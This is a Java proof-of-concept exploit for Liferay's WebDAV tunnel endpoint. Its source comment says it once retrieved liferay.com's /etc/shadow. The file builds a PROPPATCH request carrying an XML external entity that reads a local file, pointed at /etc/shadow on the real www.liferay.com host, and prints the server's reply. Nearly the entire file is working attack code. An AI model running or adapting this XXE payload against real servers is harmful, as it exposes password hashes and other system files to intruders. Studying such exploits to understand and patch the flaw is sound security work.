package nl.orange11.liferay;

import org.apache.commons.httpclient.Credentials;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.UsernamePasswordCredentials;
import org.apache.commons.httpclient.auth.AuthScope;
import org.apache.commons.httpclient.methods.EntityEnclosingMethod;
import org.apache.commons.httpclient.methods.StringRequestEntity;

import java.io.UnsupportedEncodingException;

/**
 * Sample code that at some point in time was able to download the liferay.com /etc/shadow file
 */
public class Main {

    private static final String HOST_NAME = "www.liferay.com";
    private static final int PORT = 80;
    private static final boolean HTTPS = false;
    private static final String PATH = "/tunnel-web/secure/webdav/guest/journal/Templates/9043379";

    private static final String USERNAME = "any_valid_liferay.com_user";
    private static final String PASSWORD = "the_password_of_the_user";

    private static final String FILE_TO_READ = "file:///etc/shadow";

    public static void main(String[] args) throws Exception {

        HttpClient client = new HttpClient();

        Credentials credentials = new UsernamePasswordCredentials(USERNAME, PASSWORD);
        client.getState().setCredentials(new AuthScope(HOST_NAME, PORT, AuthScope.ANY_REALM), credentials);

        PropPatchMethod method = new PropPatchMethod(
                HTTPS ? "https" : "http" + "://" + HOST_NAME + ":" + PORT + PATH, FILE_TO_READ);
        try {
            client.executeMethod(method);
            System.out.println(method.getResponseBodyAsString());
        } finally {
            method.releaseConnection();
        }
    }

    private static class PropPatchMethod extends EntityEnclosingMethod {

        private PropPatchMethod(String uri, String fileToRead) {
            super(uri);

            try {
                setRequestEntity(new StringRequestEntity("<?xml version=\"1.0\"?>\n" +
                        "<!DOCTYPE file [\n" +
                        "<!ELEMENT file (#PCDATA) >\n" +
                        "<!ENTITY contents SYSTEM \"" + fileToRead + "\">\n" +
                        "]>\t\n" +
                        "<D:propertyupdate xmlns:D=\"DAV:\" xmlns:o=\"urn:schemas-jelmer-nl:content\">\n" +
                        "  <D:set>\n" +
                        "    <D:prop>\n" +
                        "      <o:Content>&contents;</o:Content>\n" +
                        "    </D:prop>\n" +
                        "  </D:set>\n" +
                        "</D:propertyupdate>", null, "utf-8"));

            } catch (UnsupportedEncodingException e) {
                throw new AssertionError("Cannot happen.");
            }
        }

        @Override
        public String getName() {
            return "PROPPATCH";
        }
    }
}